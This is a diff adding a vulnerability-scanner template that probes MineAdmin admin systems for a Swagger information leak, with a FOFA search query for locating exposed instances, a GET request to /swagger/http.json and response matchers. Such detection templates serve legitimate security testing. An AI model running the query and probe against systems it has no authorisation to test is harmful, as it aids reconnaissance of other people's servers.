@@ -1,0 +1,29 @@
+## id: VEID-2026-11102
+## name: MineAdmin企业级后台管理系统swagger信息泄露漏洞
+## author: hack007x
+## severity: medium
+## tags: veid,file,veid2026
+## description: MineAdmin后台管理系统基于 Hyperf 框架开发。是一个后台权限管理系统，提供完善的权限体系，让开发者把注意力集中到具体业务当中，降低开发成本，提高项目效率。在系统默认配置部署的情况下存在swagger信息泄露
+## affects: MineAdmin v1.x MineAdmin v2.x
+## fofa-query: body="MineAdmin"
+## verification: true
+
+
+
+GET /swagger/http.json HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+
+
+
+#@ condition: and
+#@ matcher: header["Content-Type"] contains "json" 
+#@ matcher: body contains '"swagger":' && body contains '"description":'
+#@ matcher: status_code == 200
+
+
+
+
+# @VEIL-STAMP: d3052147800f4191ce9adce5706b56b3173258d00a53eeedc1d4a6dfd6225457
